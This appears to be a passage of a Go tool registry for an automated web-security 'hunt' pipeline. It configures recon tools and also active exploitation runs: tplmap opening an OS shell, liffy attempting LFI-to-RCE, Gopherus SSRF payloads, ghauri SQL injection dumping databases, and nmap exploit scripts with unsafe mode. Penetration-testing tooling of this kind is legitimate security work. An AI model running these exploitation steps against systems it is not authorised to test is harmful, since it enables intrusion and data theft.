				return []string{"-r", reqFile, "-p", "url", "-m", "readfiles"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 2.5 — JS DEEP ANALYSIS
	// Goal: extract endpoints, secrets, API keys, vulnerable libs from JS files
	// Pipeline: secretfinder → jsluice → linkfinder → retire.js → sourcemapper
	// ══════════════════════════════════════════════════════════════════════════

	// ── SecretFinder — extract secrets/API keys from JS files ────────────────
	// Regex patterns: AWS keys, Slack tokens, GitHub tokens, Google API, etc.
	// Better than mantra for comprehensive secret extraction
	{
		Name:        "secretfinder",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/m4ll0k/SecretFinder /opt/secretfinder && pip3 install -r /opt/secretfinder/requirements.txt --break-system-packages && sudo tee /usr/local/bin/secretfinder > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/secretfinder/SecretFinder.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/secretfinder",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-i", u,
				"-e",          // extract from all JS files on page
				"-o", "cli",   // output to terminal
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-i", u, "-o", "cli"}
			},
		},
	},

	// ── jsluice — extract URLs, endpoints, params from minified/obfuscated JS ─
	// Handles webpack bundles, minified code — finds hidden API endpoints
	{
		Name:        "jsluice",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/BishopFox/jsluice/cmd/jsluice@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// jsluice reads JS files — pipe JS file URLs to it
			jsFiles := []string{}
			for _, u := range ctx.AllURLs {
				if strings.HasSuffix(strings.ToLower(u), ".js") ||
					strings.Contains(strings.ToLower(u), ".js?") {
					jsFiles = append(jsFiles, u)
				}
			}
			if len(jsFiles) > 0 {
				f := writeTempList(jsFiles)
				if f != "" {
					return []string{"urls", "-R", f}
				}
			}
			// Fallback: crawl target for JS files
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{"urls", u}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"secrets", u}
			},
		},
	},

	// ── LinkFinder — extract endpoints from JS source code ───────────────────
	// Specifically designed for endpoint discovery in JS files
	// Better than generic URL extraction — finds relative paths, API routes
	{
		Name:        "linkfinder",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/GerbenJavado/LinkFinder /opt/linkfinder && pip3 install -r /opt/linkfinder/requirements.txt --break-system-packages && sudo tee /usr/local/bin/linkfinder > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/linkfinder/linkfinder.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/linkfinder",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-i", u,
				"-d",          // domain crawl mode
				"-o", "cli",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-i", u, "-o", "cli"}
			},
		},
	},

	// ── retire.js — detect vulnerable JavaScript libraries ───────────────────
	// Finds outdated jQuery, Bootstrap, Angular, React with known CVEs
	// Critical for finding client-side vulnerabilities
	{
		Name:        "retire",
		Phase:       2,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "npm install -g retire",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"--js",
				"--jsrepo", "https://raw.githubusercontent.com/RetireJS/retire.js/master/repository/jsrepository.json",
				"--outputformat", "json",
				"--outputpath", "/tmp/cybermind_retire.json",
				"--url", u,
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"--js", "--url", u}
			},
		},
	},

	// ── sourcemapper — extract source maps from JS files ─────────────────────
	// Recovers original source code from .js.map files
	// Finds: hidden API endpoints, internal paths, developer comments, secrets
	{
		Name:        "sourcemapper",
		Phase:       2,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/denandz/sourcemapper@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Try common source map locations
			return []string{
				"-url", u + "/static/js/main.chunk.js.map",
				"-output", "/tmp/cybermind_sourcemap/",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-url", u + "/app.js.map", "-output", "/tmp/cybermind_sourcemap/"}
			},
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-url", u + "/bundle.js.map", "-output", "/tmp/cybermind_sourcemap/"}
			},
		},
	},

	// ── CMSeeK — CMS detection and vulnerability scanning ────────────────────
	// Detects: WordPress, Drupal, Joomla, Magento, OpenCart, 180+ CMSes
	// Then runs CMS-specific vulnerability checks
	{
		Name:        "cmseek",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/Tuhinshubhra/CMSeeK /opt/cmseek && pip3 install -r /opt/cmseek/requirements.txt --break-system-packages && sudo tee /usr/local/bin/cmseek > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/cmseek/cmseek.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/cmseek",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"--follow-redirect",
				"--batch",     // non-interactive
				"-r",          // random user agent
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--batch"}
			},
		},
	},

	// ── JSA (JS Analyzer) — deep JS analysis for endpoints and secrets ────────
	// Analyzes JS files for: API endpoints, hardcoded credentials, tokens
	// Better than subjs for structured analysis
	{
		Name:        "jsa",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "pip3 install jsanalyzer --break-system-packages || git clone https://github.com/w9w/JSA /opt/jsa && pip3 install -r /opt/jsa/requirements.txt --break-system-packages && sudo tee /usr/local/bin/jsa > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/jsa/jsa.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/jsa",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-o", "/tmp/cybermind_jsa/",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u}
			},
		},
	},
	// ── getjswords — generate wordlist from JS content ────────────────────────
	// Extracts words from JS files → custom wordlist for targeted fuzzing
	// These words are domain-specific and find endpoints generic wordlists miss
	{
		Name:        "getjswords",
		Phase:       2,
		Timeout:     120,
		DomainOnly:  true,
		InstallHint: "pip3 install getjswords --break-system-packages",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{"-u", u, "-o", "/tmp/cybermind_jswords.txt"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{u}
			},
		},
	},
	// ── uro — URL deduplication + pattern normalization ───────────────────────
	// Deduplicates crawled URLs, removes noise, normalizes patterns
	// Essential before feeding URLs to vulnerability scanners
	{
		Name:        "uro",
		Phase:       2,
		Timeout:     60,
		DomainOnly:  true,
		InstallHint: "pip3 install uro --break-system-packages",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// uro reads from stdin — pipe all collected URLs through it
			allURLFiles := []string{
				"/tmp/cybermind_gau.txt",
				"/tmp/cybermind_waymore.txt",
				"/tmp/cybermind_katana_hunt.txt",
			}
			for _, f := range allURLFiles {
				if _, err := os.Stat(f); err == nil {
					return []string{"-i", f, "-o", "/tmp/cybermind_uro_hunt.txt"}
				}
			}
			return []string{"-o", "/tmp/cybermind_uro_hunt.txt"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-o", "/tmp/cybermind_uro_hunt.txt"}
			},
		},
	},
	// ── SwaggerSpy — Swagger/OpenAPI endpoint discovery ──────────────────────
	// Finds undocumented API endpoints via Swagger/OpenAPI spec analysis
	// Discovers hidden admin endpoints, deprecated APIs, internal routes
	{
		Name:        "swaggerspy",
		Phase:       2,
		Timeout:     120,
		DomainOnly:  true,
		InstallHint: "pip3 install swaggerspy --break-system-packages || git clone https://github.com/UndeadSec/SwaggerSpy /opt/swaggerspy && pip3 install -r /opt/swaggerspy/requirements.txt --break-system-packages && sudo ln -sf /opt/swaggerspy/swaggerspy.py /usr/local/bin/swaggerspy",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{u}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{u}
			},
		},
	},

	// ── NEW 2025: tplmap — SSTI detection and exploitation ──
	{
		Name:        "tplmap",
		Phase:       5,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Find a URL with parameters — best SSTI candidate
			u := target
			for _, lu := range ctx.LiveURLs {
				if strings.Contains(lu, "=") {
					u = lu
					break
				}
			}
			for _, lu := range ctx.AllURLs {
				if strings.Contains(lu, "=") {
					u = lu
					break
				}
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"--level", "5",
				"--os-shell",
				"--os-cmd", "id",
				"--engine", "Jinja2,Twig,Smarty,Mako,Tornado,Freemarker,Velocity,Pebble,Jade,Slim,ERB,Nunjucks,Pug",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--level", "3"}
			},
		},
	},

	// ── NEW 2025: liffy — LFI exploitation framework ──
	{
		Name:        "liffy",
		Phase:       5,
		Timeout:     1200,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/mzfr/liffy /opt/liffy && pip3 install -r /opt/liffy/requirements.txt --break-system-packages && sudo tee /usr/local/bin/liffy > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/liffy/liffy.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/liffy",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-c",          // check for LFI
				"-e",          // exploit
				"--rce",       // try RCE via LFI
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-c"}
			},
		},
	},

	// ── NEW 2025: gopherus — SSRF payload generator for internal services ──
	{
		Name:        "gopherus",
		Phase:       5,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/tarunkant/Gopherus /opt/gopherus && pip3 install -r /opt/gopherus/requirements.txt --break-system-packages && sudo tee /usr/local/bin/gopherus > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/gopherus/gopherus.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/gopherus",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Generate SSRF payloads for common internal services
			return []string{"--exploit", "mysql"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--exploit", "redis"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 6 — NETWORK VULNERABILITY SCRIPTS
	// Goal: network-level CVEs — Heartbleed, SMB vulns, SSL issues, auth bypass
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "nmap",
		Phase:       6,
		Timeout:     3600,
		DomainOnly:  false,
		InstallHint: "sudo apt install nmap",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			args := []string{
				"-sV",
				"--script", "vuln,exploit,auth,http-vuln*,ssl-heartbleed,ssl-enum-ciphers,smb-vuln*,dns-zone-transfer,ftp-anon,smtp-vuln*",
				"--script-args", fmt.Sprintf("unsafe=1,smbsecuritymode=1,vulns.showall"),
				"-Pn", "--open", "-T4",
				"--version-intensity", "9",
				"-oA", "/tmp/cybermind_nmap_hunt",
			}
			if len(ctx.OpenPorts) > 0 {
				ports := make([]string, len(ctx.OpenPorts))
				for i, p := range ctx.OpenPorts {
					ports[i] = fmt.Sprintf("%d", p)
				}
				args = append(args, "-p", strings.Join(ports, ","))
			} else {
				args = append(args, "--top-ports", "5000")
			}
			args = append(args, target)
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-sV", "--script", "vuln", "-Pn", "--open", "--top-ports", "1000", target}
			},
		},
	},

	// ── 2025 NEW: ghauri — advanced SQL injection tool (better than sqlmap) ──
	// Supports: error-based, time-based, boolean-based, UNION, stacked queries
	// Faster and more accurate than sqlmap for modern apps
	{
		Name:        "ghauri",
		Phase:       5,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "pip3 install ghauri --break-system-packages",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Find URLs with parameters for SQL injection testing
			var sqlURLs []string
			for _, u := range append(ctx.AllURLs, ctx.LiveURLs...) {
				if strings.Contains(u, "=") {
					sqlURLs = append(sqlURLs, u)
				}
			}
			if len(sqlURLs) > 0 {
				f := writeTempList(sqlURLs)
				if f != "" {
					return []string{
						"-m", f,
						"--level", "3",
						"--threads", "10",
						"--batch",
						"--dbs",
						"--random-agent",
						"--output-dir", "/tmp/cybermind_ghauri/",
					}
				}
			}
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"--level", "3",
				"--threads", "10",
				"--batch",
				"--dbs",
				"--random-agent",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--level", "1", "--batch", "--random-agent"}
			},
		},
	},

	// ── puredns — fast DNS brute-force with wildcard filtering ──
	{
		Name:        "puredns",
		Phase:       2,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/d3mondev/puredns/v2@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			wordlist := "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
			if _, err := os.Stat(wordlist); err != nil {
				wordlist = "/usr/share/wordlists/dirb/common.txt"
			}
			// Auto-download resolvers if missing
			resolvers := "/tmp/cybermind_resolvers.txt"
			if _, err := os.Stat(resolvers); err != nil {
				exec.Command("curl", "-sL",
					"https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt",
					"-o", resolvers).Run()
			}
			args := []string{
				"bruteforce", wordlist, target,
				"--threads", "100",
				"--rate-limit", "1000",
				"--write", "/tmp/cybermind_puredns.txt",
			}
			if _, err := os.Stat(resolvers); err == nil {
				args = append(args, "--resolvers", resolvers)
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				wordlist := "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
				if _, err := os.Stat(wordlist); err != nil {
					wordlist = "/usr/share/wordlists/dirb/common.txt"
				}
				return []string{"bruteforce", wordlist, target, "--threads", "50"}
			},
		},
	},

	// ── interactsh-client — OOB/blind vulnerability detection ──
	{
		Name:        "interactsh-client",
		Phase:       5,
		Timeout:     60, // reduced from 300 — just register and get URL
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"-n", "1",           // 1 interaction URL
				"-poll-interval", "5",
				"-json",
				"-o", "/tmp/cybermind_interactsh.json",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-n", "1", "-json"}
			},
		},
	},

	// ── ffuf (param fuzzing mode) — hidden parameter discovery ──
	// Uses ffuf binary but with parameter fuzzing mode
	{
		Name:        "ffuf",  // uses ffuf binary — always available if ffuf installed
		Phase:       3,
		Timeout:     600,
		DomainOnly:  true,
		CascadeGroup: "paramfuzz",
		InstallHint: "sudo apt install ffuf",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			paramWordlist := "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
			if _, err := os.Stat(paramWordlist); err != nil {
				paramWordlist = "/usr/share/wordlists/dirb/common.txt"
			}
			return []string{
				"-w", paramWordlist,
				"-u", u + "?FUZZ=cybermind_test",
				"-t", "100",
				"-ac",
				"-mc", "200,201,204,301,302,307,401,403",
				"-fc", "404",
				"-o", "/tmp/cybermind_ffuf_params.json",
				"-of", "json",
				"-s",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{
					"-w", "/usr/share/wordlists/dirb/common.txt",
					"-u", u + "?FUZZ=test",
					"-t", "50", "-ac", "-s",
				}
			},
		},
	},
}
